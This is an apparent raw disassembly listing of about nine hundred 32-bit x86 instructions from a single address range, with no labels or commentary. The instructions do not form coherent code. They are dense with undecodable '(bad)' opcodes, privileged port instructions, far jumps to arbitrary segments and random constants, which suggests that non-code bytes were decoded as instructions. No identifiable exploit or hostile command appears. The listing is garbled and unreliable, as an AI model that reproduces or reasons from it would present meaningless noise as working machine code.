  407dd3:	or     dl,BYTE PTR [edx]
  407dd5:	out    dx,eax
  407dd6:	(bad)  
  407dd7:	mov    al,ds:0x4a5d000f
  407ddc:	cmp    ah,BYTE PTR [ecx-0x15b268b7]
  407de2:	popa   
  407de3:	out    0xfe,eax
  407de5:	sbb    DWORD PTR [ebp-0x3e906470],ebp
  407deb:	mov    esi,0x986326e4
  407df0:	pop    ds
  407df1:	(bad)
  407df4:	mov    ds:0xfbf69a97,eax
  407df9:	adc    eax,DWORD PTR [esi]
  407dfb:	aad    0x17
  407dfd:	retf   
  407dfe:	bound  edi,QWORD PTR [edi+0x39a4d426]
  407e04:	adc    BYTE PTR [ecx],0x5f
  407e07:	neg    ah
  407e09:	dec    esi
  407e0a:	adc    BYTE PTR [ebx+0x32],dl
  407e0d:	cmp    DWORD PTR [esi],edx
  407e0f:	loop   0x407db3
  407e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e12:	push   edx
  407e13:	sahf   
  407e14:	mov    ds:0xd5c488c6,al
  407e19:	add    bh,BYTE PTR [ebx+0x9]
  407e1c:	inc    ebx
  407e1d:	sub    ecx,DWORD PTR [edi+ebp*4-0x9]
  407e21:	inc    ebp
  407e22:	aad    0xca
  407e24:	jno    0x407e65
  407e26:	nop
  407e27:	mov    ch,0x2b
  407e29:	nop
  407e2a:	pop    es
  407e2b:	loop   0x407e97
  407e2d:	jg     0x407e21
  407e2f:	xchg   BYTE PTR [ecx-0x12],bl
  407e32:	cmp    DWORD PTR [esi-0xd],ecx
  407e35:	imul   eax,eax,0x56230fd0
  407e3b:	adc    BYTE PTR [edx],0x4b
  407e3e:	xchg   DWORD PTR [edi-0x5a2e4db6],esi
  407e44:	js     0x407e0d
  407e46:	rol    bh,0x6c
  407e49:	jno    0x407e80
  407e4b:	pop    ss
  407e4c:	push   ebp
  407e4d:	ins    DWORD PTR es:[edi],dx
  407e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e4f:	scas   eax,DWORD PTR es:[edi]
  407e50:	mov    ds:0xbff57c10,al
  407e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e56:	call   0x8d5b:0xa650d71e
  407e5d:	and    BYTE PTR [esi-0x79],ah
  407e60:	mov    al,0x54
  407e62:	and    bl,BYTE PTR [esi]
  407e64:	ret    0xedc3
  407e67:	jecxz  0x407e24
  407e69:	mov    eax,0x4ff1bc15
  407e6e:	inc    esp
  407e6f:	add    edx,edx
  407e71:	adc    DWORD PTR [esi+0x85736d0],esi
  407e77:	retf   0x7437
  407e7a:	test   DWORD PTR [ebx+0x6b],eax
  407e7d:	push   ebp
  407e7e:	(bad)  
  407e80:	cli    
  407e81:	mov    ch,0x34
  407e83:	hlt    
  407e84:	sbb    DWORD PTR [eax],esi
  407e86:	(bad)  
  407e87:	fisubr WORD PTR [edi-0x44]
  407e8a:	dec    ebx
  407e8b:	adc    eax,0xb930c4a
  407e90:	xor    al,0x4f
  407e92:	aaa    
  407e93:	pushf  
  407e94:	lds    ebp,FWORD PTR [edx-0x673a9ad0]
  407e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e9b:	ret    
  407e9c:	imul   edx,DWORD PTR [ebp+0x17],0xffffffb6
  407ea0:	sbb    ecx,DWORD PTR [ecx]
  407ea2:	fs ja  0x407e6c
  407ea5:	lea    esp,[edi]
  407ea7:	fidiv  WORD PTR [edx+0x17769c75]
  407ead:	mov    ah,0x41
  407eaf:	out    dx,al
  407eb0:	or     al,BYTE PTR [eax+0x8]
  407eb3:	jg     0x407e90
  407eb5:	fs xchg esp,eax
  407eb7:	xchg   edi,eax
  407eb8:	add    DWORD PTR [ecx],0xfffffff8
  407ebb:	jmp    0xfecc:0xf2a6070a
  407ec2:	rcr    BYTE PTR [esi-0x18],0x46
  407ec6:	(bad)  [ecx+ecx*1-0x27bf0d51]
  407ecd:	out    dx,al
  407ece:	data16 cmp cl,BYTE PTR [ebp+0x6ebc1047]
  407ed5:	sub    eax,0x6fdc6d9f
  407eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407edb:	inc    edi
  407edc:	iret   
  407edd:	fimul  DWORD PTR [ebx-0xb]
  407ee0:	xchg   ebx,esp
  407ee2:	retf   
  407ee3:	mov    DWORD PTR [ecx],ebp
  407ee5:	daa    
  407ee6:	rcr    dl,0x30
  407ee9:	ss pop ecx
  407eeb:	inc    edx
  407eec:	int    0xc0
  407eee:	push   ebx
  407eef:	repz adc bh,BYTE PTR [edi+0x45]
  407ef3:	(bad)  
  407ef4:	add    edx,0x73
  407ef7:	aaa    
  407ef8:	xchg   esi,eax
  407ef9:	jmp    0x407f2d
  407efb:	mov    ch,0xb0
  407efd:	and    bl,BYTE PTR [edx]
  407eff:	pop    ebx
  407f00:	mov    ds:0xffff6858,eax
  407f05:	and    eax,0xbd01fed8
  407f0a:	clc    
  407f0b:	mov    edx,0x25e9e205
  407f10:	imul   eax,DWORD PTR [ebp+0x7],0xfffffff4
  407f14:	mov    esp,0xccb3f4c4
  407f19:	jmp    0x34ffa263
  407f1e:	bound  esp,QWORD PTR [edx+0xc]
  407f21:	(bad)  
  407f22:	retf   
  407f23:	mov    edx,0x38167a10
  407f28:	jbe    0x407eac
  407f2a:	pushf  
  407f2b:	pop    DWORD PTR [edi-0x3eb3c381]
  407f31:	test   al,0xc6
  407f33:	adc    al,0xef
  407f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f36:	mov    esi,0x1ffdadf8
  407f3b:	and    eax,0x251fc49f
  407f40:	pushf  
  407f41:	pop    esp
  407f42:	ror    BYTE PTR [ebx+eiz*2+0x3c],1
  407f46:	ins    DWORD PTR es:[edi],dx
  407f47:	add    al,0xb1
  407f49:	or     edx,0xffffffca
  407f4c:	retf   
  407f4d:	in     eax,0x7b
  407f4f:	sbb    DWORD PTR [eax+0x4c],ebx
  407f52:	xor    bl,cl
  407f54:	inc    ebp
  407f55:	fs and eax,0xa0c2f3dd
  407f5b:	ret    0x6526
  407f5e:	inc    ecx
  407f5f:	xchg   ecx,ecx
  407f61:	outs   dx,DWORD PTR ds:[esi]
  407f62:	sbb    ch,bh
  407f64:	jge    0x407fa8
  407f66:	stos   DWORD PTR es:[edi],eax
  407f67:	imul   edx,DWORD PTR [edx+0x23514ef0],0xe761d848
  407f71:	add    BYTE PTR [edi-0x5ce2ea4a],cl
  407f77:	pop    esi
  407f78:	std    
  407f79:	push   ecx
  407f7a:	out    0xfd,al
  407f7c:	outs   dx,BYTE PTR gs:[esi]
  407f7e:	test   eax,0x5fc071f2
  407f83:	push   ss
  407f84:	fild   QWORD PTR [ebx+edx*1]
  407f87:	mov    ebp,0x9c406a43
  407f8c:	repz sbb eax,0x2ec5c8d
  407f92:	addr16 in eax,0xca
  407f95:	ds iret 
  407f97:	mov    ecx,0x1cfa76d9
  407f9c:	and    ebx,ebx
  407f9e:	sub    al,0x1
  407fa0:	(bad)  
  407fa1:	xor    ebp,DWORD PTR [esi+0x54569548]
  407fa7:	(bad)  
  407fa8:	scas   eax,DWORD PTR es:[edi]
  407fa9:	xor    DWORD PTR [ebp+0x7eb22679],esp
  407faf:	cmp    al,0x0
  407fb1:	rcl    ecx,1
  407fb3:	adc    ch,BYTE PTR [edx+0x1f011a7b]
  407fb9:	pusha  
  407fba:	popa   
  407fbb:	iret   
  407fbc:	mov    eax,0xba412b0b
  407fc1:	adc    edi,DWORD PTR [ecx-0xd]
  407fc4:	dec    ebp
  407fc5:	xchg   ecx,eax
  407fc6:	xchg   ebp,eax
  407fc7:	retf   0x6d06
  407fca:	mov    bh,0x74
  407fcc:	sub    ebx,DWORD PTR [eax-0x72]
  407fcf:	sub    al,0xfd
  407fd1:	pop    ebx
  407fd2:	fidivr WORD PTR [ecx+0x6b5946f]
  407fd8:	push   eax
  407fd9:	retf   
  407fda:	or     DWORD PTR [esi],0x18510ce9
  407fe0:	dec    edi
  407fe1:	test   BYTE PTR [eax-0x21aef62f],bh
  407fe7:	in     eax,dx
  407fe8:	xchg   esp,eax
  407fe9:	inc    ebx
  407fea:	dec    esi
  407feb:	test   eax,0x495633c
  407ff0:	dec    edi
  407ff1:	inc    ebp
  407ff2:	arpl   WORD PTR [ebx],bx
  407ff4:	shl    bh,1
  407ff6:	adc    eax,0x194587da
  407ffb:	loope  0x407fc8
  407ffd:	pop    edx
  407ffe:	mov    BYTE PTR [ecx],ah
  408000:	mov    cl,0x87
  408002:	out    dx,eax
  408003:	mov    WORD PTR [ebp-0x7917f6a7],gs
  408009:	and    ebp,edx
  40800b:	push   ecx
  40800c:	scas   al,BYTE PTR es:[edi]
  40800d:	ret    
  40800e:	shl    BYTE PTR [ebx+ebx*1+0x7417ac52],cl
  408015:	lods   eax,DWORD PTR ds:[esi]
  408016:	xchg   esi,eax
  408017:	xor    al,0x6d
  408019:	rol    BYTE PTR [ebx],cl
  40801b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40801c:	sar    esi,0xd6
  40801f:	out    0xb4,al
  408021:	sub    esp,DWORD PTR [ecx+0x2e]
  408024:	and    esp,ebp
  408026:	inc    ebx
  408027:	mov    al,ds:0xfd1cabaf
  40802c:	cmp    DWORD PTR [ebp+0x74195356],edx
  408032:	pop    edx
  408033:	gs mov dh,0xd7
  408036:	(bad)  
  408037:	mov    esi,0xb592e580
  40803c:	mov    edi,0x58a45750
  408041:	stc    
  408042:	sub    bl,BYTE PTR [ecx+0x1d1ade92]
  408048:	ins    DWORD PTR es:[edi],dx
  408049:	shl    BYTE PTR [edi-0x5a],1
  40804c:	add    ecx,DWORD PTR [esi]
  40804e:	inc    esp
  40804f:	cmp    al,0xab
  408051:	mov    bh,0xb6
  408053:	xor    DWORD PTR [ebp-0x6f],0x53e1aa96
  40805a:	out    0x25,al
  40805c:	xchg   ebx,eax
  40805d:	test   DWORD PTR [esp+eax*4],esp
  408060:	and    eax,0x4b453c02
  408065:	cmp    DWORD PTR [eax+0x45239ab7],ebp
  40806b:	pop    ss
  40806c:	sar    DWORD PTR [ecx+eax*1-0x3a9f3074],0x87
  408074:	jg     0x408076
  408076:	cld    
  408077:	pop    edi
  408078:	xor    cl,bh
  40807a:	(bad)  
  40807b:	jl     0x40801a
  40807d:	pop    ebp
  40807e:	jmp    ebx
  408080:	dec    eax
  408081:	lods   al,BYTE PTR ds:[esi]
  408082:	jno    0x4080c1
  408084:	pop    eax
  408085:	(bad)  
  408086:	jmp    0x4080bd
  408088:	xor    al,0xb
  40808a:	push   esi
  40808b:	call   0x4e97:0xc82ef9a0
  408092:	adc    eax,0xea9811f9
  408097:	or     ecx,0xffffffcf
  40809a:	lock stos DWORD PTR es:[edi],eax
  40809c:	lahf   
  40809d:	push   ebx
  40809e:	push   eax
  40809f:	push   eax
  4080a0:	faddp  st(2),st
  4080a2:	cmp    al,0xb6
  4080a4:	xor    al,0x97
  4080a6:	xchg   esp,eax
  4080a7:	jmp    0x3496925
  4080ac:	dec    edi
  4080ad:	ins    DWORD PTR es:[edi],dx
  4080ae:	jne    0x408062
  4080b0:	inc    esp
  4080b1:	inc    ebx
  4080b2:	inc    ebp
  4080b3:	jns    0x408078
  4080b5:	fcom   DWORD PTR [edx-0x6d018f28]
  4080bb:	loope  0x40808e
  4080bd:	mov    edx,0x228c8c9d
  4080c2:	retf   
  4080c3:	xor    ch,dh
  4080c5:	rcr    al,cl
  4080c7:	push   es
  4080c8:	and    BYTE PTR [eax+0x4d8bdeb6],al
  4080ce:	push   ecx
  4080cf:	lea    ebp,[esi+ebp*8]
  4080d2:	pop    ebx
  4080d3:	pop    ss
  4080d4:	jmp    0x408134
  4080d6:	aas    
  4080d7:	mov    al,ds:0xd9f6c5e4
  4080dc:	push   ecx
  4080dd:	adc    BYTE PTR [edi],ch
  4080df:	stc    
  4080e0:	xchg   esp,eax
  4080e1:	pop    esp
  4080e2:	mov    bh,0x48
  4080e4:	mov    al,ds:0x8f89d078
  4080e9:	sahf   
  4080ea:	add    al,0x2a
  4080ec:	cwd    
  4080ee:	pop    es
  4080ef:	not    DWORD PTR [eax+edi*8]
  4080f2:	in     eax,dx
  4080f3:	pop    ebx
  4080f4:	in     al,dx
  4080f5:	or     esi,DWORD PTR fs:[ebx]
  4080f8:	mov    edx,0xe3d3421a
  4080fd:	mov    ecx,DWORD PTR [esp+eax*1+0x58]
  408101:	outs   dx,DWORD PTR ss:[esi]
  408103:	mov    al,ch
  408105:	adc    eax,0x83d29dac
  40810a:	imul   eax,DWORD PTR [edx+0x9],0x7d30817c
  408111:	inc    eax
  408112:	and    al,0xf8
  408114:	push   ds
  408115:	xchg   ecx,eax
  408116:	fadd   QWORD PTR [ebx]
  408118:	mov    bh,BYTE PTR [edx]
  40811a:	(bad)  
  40811b:	jp     0x408195
  40811d:	pop    ss
  40811e:	shl    DWORD PTR [ecx],cl
  408120:	loop   0x40817d
  408122:	out    dx,al
  408123:	data16 js 0x408191
  408126:	das    
  408127:	(bad)  
  408129:	fistp  DWORD PTR [ebx+0x3cceb12a]
  40812f:	les    edx,FWORD PTR [edi]
  408131:	out    0xd5,al
  408133:	mov    edi,0x7ae59749
  408138:	jl     0x408171
  40813a:	mov    edx,?
  40813c:	pusha  
  40813d:	ja     0x4081af
  40813f:	mov    ebx,DWORD PTR [ebx]
  408141:	(bad)  
  408142:	xchg   esp,eax
  408143:	inc    esp
  408144:	int3   
  408145:	inc    edi
  408146:	imul   ecx,ecx,0xffffffe8
  408149:	mov    bh,0xb7
  40814b:	xor    eax,0x3c6c1206
  408150:	adc    ch,al
  408152:	in     al,dx
  408153:	adc    BYTE PTR [ecx-0x35],bl
  408156:	sahf   
  408157:	mov    ebp,0x58808b80
  40815c:	mov    eax,ds:0xfd8bd358
  408161:	add    esi,DWORD PTR [ebp+ecx*4+0x3f17fd68]
  408168:	iret   
  408169:	mov    al,0xee
  40816b:	or     eax,0xc4c1ca2e
  408170:	pop    esp
  408171:	add    ebx,DWORD PTR [ebp+0x77]
  408174:	sub    al,0x59
  408176:	adc    eax,0xdaae7eff
  40817b:	je     0x4081e8
  40817d:	fdivr  QWORD PTR [eax-0x2a]
  408180:	out    0x85,eax
  408182:	xchg   esi,eax
  408183:	jg     0x408144
  408185:	les    ebp,FWORD PTR [ecx+0x4e5ede0a]
  40818b:	adc    dh,bh
  40818d:	xchg   ebx,eax
  40818e:	fistp  WORD PTR [esi-0x402e8835]
  408194:	aaa    
  408195:	inc    ebx
  408196:	mov    ch,0xb9
  408198:	xchg   DWORD PTR [ecx-0x46],ebp
  40819b:	xchg   ebx,eax
  40819c:	ficom  DWORD PTR [eax-0x39]
  40819f:	mov    bh,0x5d
  4081a1:	sti    
  4081a2:	(bad)  
  4081a4:	inc    esi
  4081a5:	or     edx,DWORD PTR [ebp+0x30]
  4081a8:	or     bl,dh
  4081aa:	cld    
  4081ab:	cli    
  4081ac:	aad    0x4e
  4081ae:	pop    sp
  4081b0:	frstor [edi+0x76e94314]
  4081b6:	scas   al,BYTE PTR es:[edi]
  4081b7:	and    DWORD PTR [ecx-0xe],ebx
  4081ba:	pop    ebx
  4081bb:	mov    ebx,0x96000163
  4081c0:	repnz cmp edi,0x79337ebc
  4081c7:	xlat   BYTE PTR ds:[ebx]
  4081c8:	dec    BYTE PTR [ecx+0x13]
  4081cb:	icebp  
  4081cc:	pop    ebx
  4081cd:	stc    
  4081ce:	div    BYTE PTR [eax]
  4081d0:	cs pop ebx
  4081d2:	xor    ah,cl
  4081d4:	shr    BYTE PTR [eax],1
  4081d6:	pop    eax
  4081d7:	sub    DWORD PTR [ecx+0x79],esi
  4081da:	ror    BYTE PTR [edi-0xae74298],1
  4081e0:	and    DWORD PTR [eax-0x19],eax
  4081e3:	mov    bl,0x82
  4081e5:	(bad)  
  4081e7:	shl    ebx,0x2c
  4081ea:	pop    esi
  4081eb:	sbb    ecx,DWORD PTR [eax-0x4ac1ae92]
  4081f1:	in     al,0x3f
  4081f3:	jnp    0x4081fa
  4081f5:	and    al,0xcc
  4081f7:	and    ecx,ebx
  4081f9:	cmp    eax,0x2bf26364
  4081fe:	cmp    dh,cl
  408200:	sub    DWORD PTR [eax-0x6513966a],eax
  408206:	mov    al,0x18
  408208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408209:	pop    esp
  40820a:	iret   
  40820b:	gs dec ebx
  40820d:	(bad)  
  40820e:	adc    al,0xdc
  408210:	lds    ecx,FWORD PTR [ecx-0x8]
  408213:	jge    0x40828d
  408215:	stc    
  408216:	into   
  408217:	lods   al,BYTE PTR ds:[esi]
  408218:	jnp    0x4081b4
  40821a:	call   0x8fb7:0xecffe7c1
  408221:	scas   eax,DWORD PTR es:[edi]
  408222:	jmp    0x37c7f2d6
  408227:	enter  0x24e2,0x6d
  40822b:	dec    edx
  40822c:	push   0x411f2dca
  408231:	or     BYTE PTR [ebx-0x4a],dl
  408234:	mov    ecx,0x42d1a4e1
  408239:	and    dh,BYTE PTR [ecx]
  40823b:	adc    DWORD PTR [ecx],ecx
  40823d:	sub    al,0x29
  40823f:	shr    esp,cl
  408241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408242:	call   FWORD PTR [ebp+0x64]
  408245:	jmp    0xaeff:0x946cf364
  40824c:	jae    0x408228
  40824e:	adc    al,0x69
  408250:	repz shl BYTE PTR [edi+0x35f2cc36],0xcf
  408258:	clc    
  408259:	scas   al,BYTE PTR es:[edi]
  40825a:	cmp    ebp,DWORD PTR [eax+eax*4-0x2d]
  40825e:	sub    edx,ebp
  408260:	add    al,0xa4
  408262:	inc    ebp
  408263:	cmc    
  408264:	mov    esi,0xb439d406
  408269:	sbb    al,0x50
  40826b:	mov    cl,0xc5
  40826d:	pop    es
  40826e:	mov    bl,0xf5
  408270:	xchg   esi,esi
  408272:	ja     0x4082a4
  408274:	sub    ebp,DWORD PTR [edi-0x72fee1f7]
  40827a:	adc    BYTE PTR [edx+0x2d8ca4d5],bl
  408280:	inc    eax
  408281:	sub    al,0xc6
  408283:	int    0x8c
  408285:	and    al,0x95
  408287:	stc    
  408288:	or     esi,DWORD PTR [ebx+0x4acbc46f]
  40828e:	cwde   
  40828f:	rcr    BYTE PTR [ebp-0x2b8be878],1
  408295:	stos   DWORD PTR es:[edi],eax
  408296:	cmc    
  408297:	sub    bl,ch
  408299:	pop    fs
  40829b:	dec    ecx
  40829c:	stc    
  40829d:	shl    DWORD PTR [ecx],0x8a
  4082a0:	das    
  4082a1:	push   ds
  4082a2:	lods   al,BYTE PTR ds:[esi]
  4082a3:	xlat   BYTE PTR ds:[ebx]
  4082a4:	aaa    
  4082a5:	mov    bh,0xa3
  4082a7:	mov    ebx,0x4277c909
  4082ac:	or     BYTE PTR [eax-0x32],dh
  4082af:	sbb    al,0x9a
  4082b1:	pop    esp
  4082b2:	mov    bl,BYTE PTR [eax+eiz*2-0x9e9727c]
  4082b9:	into   
  4082ba:	add    BYTE PTR ds:0x11e7f699,0x24
  4082c1:	out    dx,eax
  4082c2:	add    ebp,DWORD PTR [eax-0x15]
  4082c5:	ret    
  4082c6:	cmc    
  4082c7:	mov    dh,0xbd
  4082c9:	lahf   
  4082ca:	or     esp,ecx
  4082cc:	jns    0x40832c
  4082ce:	rcl    BYTE PTR [edx+0x78],1
  4082d1:	dec    ecx
  4082d2:	icebp  
  4082d3:	enter  0x76bf,0xc5
  4082d7:	jmp    0x1af22f50
  4082dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082dd:	(bad)  
  4082de:	cs dec ebx
  4082e0:	or     eax,DWORD PTR [ecx+ecx*8-0x4a15ca9]
  4082e7:	popa   
  4082e8:	outs   dx,DWORD PTR ds:[esi]
  4082e9:	push   0x9285c0d6
  4082ee:	mov    ecx,0xca222ebc
  4082f3:	(bad)  
  4082f4:	outs   dx,DWORD PTR ds:[esi]
  4082f5:	xchg   edx,eax
  4082f6:	jno    0x40834c
  4082f8:	push   ss
  4082f9:	pop    eax
  4082fa:	dec    esi
  4082fb:	fistp  DWORD PTR [ebx]
  4082fd:	xchg   DWORD PTR [esi-0x7e],esi
  408300:	xchg   edi,eax
  408301:	jo     0x40831d
  408303:	jno    0x40833c
  408305:	and    eax,0x5f20b68a
  40830a:	sbb    ebx,DWORD PTR [edx+0x41]
  40830d:	mov    ds:0x980aa031,eax
  408312:	out    0xe7,eax
  408314:	std    
  408315:	mov    DWORD PTR [ebx],ebx
  408317:	sbb    DWORD PTR [edi+ebx*4+0x38a06f0],0xdcde0a7a
  408322:	(bad)  
  408323:	adc    ah,BYTE PTR [ebp-0x621908ba]
  408329:	pop    esi
  40832a:	jg     0x4082c4
  40832c:	mov    eax,ds:0x9c1956e3
  408331:	xor    al,0x34
  408333:	sbb    DWORD PTR ds:0xa4bf4224,0x1f
  40833a:	cli    
  40833b:	xchg   esp,eax
  40833c:	repnz mov al,ds:0x7dd81d1a
  408342:	je     0x408396
  408344:	jae    0x40838e
  408346:	fmul   DWORD PTR [esi+0x42]
  408349:	jnp    0x40839f
  40834b:	lods   al,BYTE PTR ds:[esi]
  40834c:	add    ebx,esp
  40834e:	jle    0x408392
  408350:	repnz shl BYTE PTR [ecx],1
  408353:	(bad)  
  408354:	loop   0x408326
  408356:	cld    
  408357:	ins    BYTE PTR es:[edi],dx
  408358:	mov    cl,0xb8
  40835a:	adc    ch,BYTE PTR [edx-0x35]
  40835d:	sahf   
  40835e:	stc    
  40835f:	sbb    eax,0x26158f46
  408364:	ins    DWORD PTR es:[edi],dx
  408365:	(bad)  [esi+edi*2-0x7c]
  408369:	scas   eax,DWORD PTR es:[edi]
  40836a:	jbe    0x4082f7
  40836c:	add    ebx,DWORD PTR [ebx-0x36]
  40836f:	loopne 0x408381
  408371:	jno    0x408346
  408373:	aam    0xa6
  408375:	sbb    BYTE PTR [esi],cl
  408377:	test   DWORD PTR [ecx+0x11bf159a],eax
  40837d:	popa   
  40837e:	dec    eax
  40837f:	dec    edi
  408380:	and    al,0x96
  408382:	sbb    ebx,DWORD PTR [esi+edi*8+0x7b49ccd9]
  408389:	add    DWORD PTR [ecx*4+0x781a4480],edx
  408390:	test   BYTE PTR [eax-0x73],0x14
  408394:	mov    bl,0x57
  408396:	dec    ecx
  408397:	add    eax,0xb1ffb40d
  40839c:	xor    BYTE PTR [edx+ebp*4+0x4c81477d],dh
  4083a3:	pop    esi
  4083a4:	push   0xffffffce
  4083a6:	pop    ebp
  4083a7:	lock mov al,0xf7
  4083aa:	fs pop edx
  4083ac:	sbb    eax,0x37e1302e
  4083b1:	pop    es
  4083b2:	ja     0x4083f4
  4083b4:	mov    ecx,0x7ab30ba7
  4083b9:	jnp    0x408428
  4083bb:	sar    BYTE PTR [ebp-0x57],1
  4083be:	div    DWORD PTR [ebx+0x18]
  4083c1:	or     al,0x5f
  4083c3:	pop    es
  4083c4:	div    cl
  4083c6:	mov    edi,0x7466294d
  4083cb:	push   edx
  4083cc:	daa    
  4083cd:	jg     0x408382
  4083cf:	mov    eax,ds:0x7e08882c
  4083d4:	inc    BYTE PTR [edx+0x481aa392]
  4083da:	and    dh,cl
  4083dc:	retf   0xee10
  4083df:	mov    ah,0x72
  4083e1:	pop    ebp
  4083e2:	dec    edi
  4083e3:	je     0x408438
  4083e5:	(bad)  
  4083e6:	jmp    0x4083ee
  4083e8:	ss jmp 0x40841e
  4083eb:	(bad)  
  4083ec:	jmp    0xbf7ffef1
  4083f1:	das    
  4083f2:	sbb    al,0xb0
  4083f4:	xor    esi,DWORD PTR [edx]
  4083f6:	xor    DWORD PTR [eax+edx*2-0x4262e121],ebx
  4083fd:	xchg   ebp,eax
  4083fe:	lods   eax,DWORD PTR ds:[esi]
  4083ff:	jmp    0x66d0:0xc5f2d833
  408406:	scas   al,BYTE PTR es:[edi]
  408407:	popa   
  408408:	mov    ds,WORD PTR [eax+ecx*8+0x7ba81995]
  40840f:	mul    BYTE PTR [esi]
  408411:	add    eax,0x4445a314
  408416:	lds    edx,FWORD PTR [esi+0xb]
  408419:	in     eax,0x5b
  40841b:	mov    cl,0xca
  40841d:	fiadd  WORD PTR [esi-0x2e]
  408420:	fstp   QWORD PTR [ecx+eax*8]
  408423:	ror    BYTE PTR [ecx],1
  408425:	and    ah,dl
  408427:	es jno 0x4084a9
  40842a:	jb     0x408443
  40842c:	dec    ecx
  40842d:	jp     0x4083d6
  40842f:	xor    eax,0x6a7c35da
  408434:	sub    DWORD PTR [ebp+0x2c],eax
  408437:	xchg   ecx,eax
  408438:	pop    ebp
  408439:	sti    
  40843a:	xchg   ebx,eax
  40843b:	jl     0x40849e
  40843d:	pop    ebp
  40843e:	jb     0x408447
  408440:	or     al,0x79
  408442:	ja     0x408444
  408444:	out    dx,al
  408445:	popa   
  408446:	not    DWORD PTR [ecx-0x2e3005dc]
  40844c:	cli    
  40844d:	or     DWORD PTR [ecx+ebp*1],0x1e3370c4
  408454:	mov    BYTE PTR [eax],dh
  408456:	jg     0x40841a
  408458:	inc    eax
  408459:	mov    ebx,0x62d1dcf2
  40845e:	das    
  40845f:	hlt    
  408460:	mov    WORD PTR [esi],ds
  408462:	repz xor BYTE PTR [esi+0x149ae7a7],dl
  408469:	add    eax,0x8036c1d4
  40846e:	cli    
  40846f:	scas   eax,DWORD PTR es:[edi]
  408470:	aaa    
  408471:	jne    0x4084c9
  408473:	adc    cl,BYTE PTR [edx]
  408475:	rcl    DWORD PTR [eax+0x8b069b2],cl
  40847b:	mov    ebp,0xdb00a414
  408480:	and    BYTE PTR [ebx],cl
  408482:	int    0x33
  408484:	push   eax
  408485:	ja     0x408462
  408487:	adc    edi,ebp
  408489:	retf   0x51a3
  40848c:	and    DWORD PTR [edx+0x1c],ecx
  40848f:	rol    DWORD PTR [edi-0x155756e7],1
  408495:	xchg   esi,eax
  408496:	push   ecx
  408497:	fstp   DWORD PTR [ebx+0x756257d7]
  40849d:	sti    
  40849e:	into   
  40849f:	add    al,0xa4
  4084a1:	xchg   esp,eax
  4084a2:	xor    DWORD PTR [eax-0x65a45fc],esp
  4084a8:	push   ecx
  4084a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084aa:	fucom  st(2)
  4084ac:	mov    ah,0xc8
  4084ae:	ins    BYTE PTR es:[edi],dx
  4084af:	pop    ss
  4084b0:	push   edi
  4084b1:	std    
  4084b2:	mov    edx,0x430a1b84
  4084b7:	scas   al,BYTE PTR es:[edi]
  4084b8:	xchg   ebx,eax
  4084b9:	fcom   DWORD PTR [esi]
  4084bb:	cmp    esp,DWORD PTR [ebx]
  4084bd:	test   BYTE PTR [ebx],bl
  4084bf:	loopne 0x40849b
  4084c1:	jp     0x40847f
  4084c3:	adc    DWORD PTR [edi-0x26],esi
  4084c6:	pop    ebx
  4084c7:	and    al,0x53
  4084c9:	dec    ebx
  4084ca:	inc    edi
  4084cb:	loop   0x4084a7
  4084cd:	or     ebp,ecx
  4084cf:	jae    0x4084f5
  4084d1:	sar    DWORD PTR [edi+eax*1-0x60],cl
  4084d5:	mov    cl,0x1b
  4084d7:	out    dx,al
  4084d8:	sub    al,ah
  4084da:	mov    ds:0xeec734a7,al
  4084df:	mov    esi,0x298ed35c
  4084e4:	lock push cs
  4084e6:	sub    DWORD PTR [eax],esp
  4084e8:	mov    ecx,0xfebce1ea
  4084ed:	xor    DWORD PTR [eax-0x4d],edi
  4084f0:	loopne 0x4084b7
  4084f2:	sbb    eax,0xc3038033
  4084f7:	mov    al,0xc2
  4084f9:	repz inc edx
  4084fb:	dec    ebx
  4084fc:	cdq    
  4084fd:	popa   
  4084fe:	enter  0x6ce6,0xd9
  408502:	push   ebx
  408503:	in     eax,0xb8
  408505:	push   ebx
  408506:	mov    ebx,DWORD PTR [eax-0x13]
  408509:	or     BYTE PTR [edi],bl
  40850b:	dec    esp
  40850c:	mov    dh,0x41
  40850e:	lods   eax,DWORD PTR ds:[esi]
  40850f:	out    dx,al
  408510:	xor    dl,BYTE PTR [esi-0x41]
  408513:	test   BYTE PTR [edi+0x34],dl
  408516:	scas   eax,DWORD PTR es:[edi]
  408517:	cmp    dh,BYTE PTR [edx]
  408519:	cli    
  40851a:	lods   eax,DWORD PTR ds:[esi]
  40851b:	test   eax,0x7cc6f8da
  408520:	sbb    al,0x6f
  408522:	jle    0x408516
  408524:	js     0x408531
  408526:	(bad)  
  408528:	mov    edi,0xeab76003
  40852d:	pop    edi
  40852e:	lds    esi,FWORD PTR [esi+0x431af0ff]
  408534:	mov    cl,0x77
  408536:	outs   dx,DWORD PTR ds:[esi]
  408537:	iret   
  408538:	out    0x57,eax
  40853a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40853b:	movaps XMMWORD PTR [ebx],xmm4
  40853e:	dec    ebp
  40853f:	jo     0x408562
  408541:	dec    ebp
  408542:	ds dec eax
  408544:	pusha  
  408545:	sub    al,0xfd
  408547:	sti    
  408548:	fld    TBYTE PTR [edx]
  40854a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40854b:	or     eax,0x2ad40d51
  408550:	xchg   ebx,eax
  408551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408552:	in     eax,dx
  408553:	sub    edi,DWORD PTR [edi+0x3d]
  408556:	hlt    
  408557:	xchg   BYTE PTR [ebp+0x9],dh
  40855a:	loope  0x4084ee
  40855c:	lahf   
  40855d:	cmc    
  40855e:	sbb    DWORD PTR [edi+0x7b],esi
  408561:	out    dx,eax
  408562:	lahf   
  408563:	push   eax
  408564:	mov    dl,0x74
  408566:	mov    edx,0xb4b078e
  40856b:	fst    DWORD PTR [edx+0x4e]
  40856e:	mov    ss:0x66b9f1e2,al
  408574:	stos   BYTE PTR es:[edi],al
